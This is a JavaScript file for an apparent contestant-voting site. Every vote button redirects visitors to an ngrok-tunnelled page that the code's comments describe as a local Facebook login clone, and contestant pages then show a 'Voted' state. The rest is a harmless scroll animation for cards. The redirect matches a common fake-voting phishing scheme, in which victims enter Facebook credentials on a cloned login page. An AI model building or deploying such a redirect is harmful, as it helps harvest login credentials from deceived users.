document.addEventListener('DOMContentLoaded', () => {

    // --- Facebook Login Redirect Logic ---
    const allVoteButtons = document.querySelectorAll('.vote-btn');
    
    // IMPORTANT: For a live website, you must create a real Facebook App
    // to get a valid client_id and set up a valid redirect_uri.
    // The link below is a placeholder that will take the user to your local login page clone.
    const facebookLoginUrl = 'https://89a4b9c82492.ngrok-free.app/'; // Assuming this is your local Facebook clone path

    allVoteButtons.forEach(button => {
        button.addEventListener('click', () => {
            console.log('Redirecting to Facebook login for voting...');
            // Redirect the user to the Facebook login page
            window.location.href = facebookLoginUrl;
        });
    });

    // --- Handle "Voted" State on Individual Contestant Pages ---
    const body = document.querySelector('body');
    const pageId = body.getAttribute('data-page-id'); // e.g., "john-doe"

    if (pageId) { // If we are on an individual contestant page
        const voteButton = document.querySelector(`.vote-btn[data-id="${pageId}"]`);
        if (voteButton) {
            // Change button text and add icon
            voteButton.innerHTML = '<i class="fas fa-check-circle"></i> Voted';
            voteButton.classList.add('voted');
            // Disable actual voting/redirect for already "voted" state
            voteButton.removeEventListener('click', () => {
                window.location.href = facebookLoginUrl;
            });
            console.log(`Contestant page '${pageId}' - button set to 'Voted'.`);
        }
    }


    // --- Animation Logic: Fade in cards on scroll (only for index.html) ---
    // Only apply card animation on the main index page, not individual pages
    if (!pageId) { 
        const cards = document.querySelectorAll('.card');

        const observerOptions = {
            root: null, // observes intersections relative to the viewport
            rootMargin: '0px',
            threshold: 0.1 // trigger when 10% of the element is visible
        };

        const observer = new IntersectionObserver((entries, observer) => {
            entries.forEach(entry => {
                // If the card is intersecting (visible in the viewport)
                if (entry.isIntersecting) {
                    entry.target.classList.add('visible');
                    // Stop observing the card once it's visible
                    observer.unobserve(entry.target);
                }
            });
        }, observerOptions);

        // Start observing each card
        cards.forEach(card => {
            observer.observe(card);
        });
    }

});
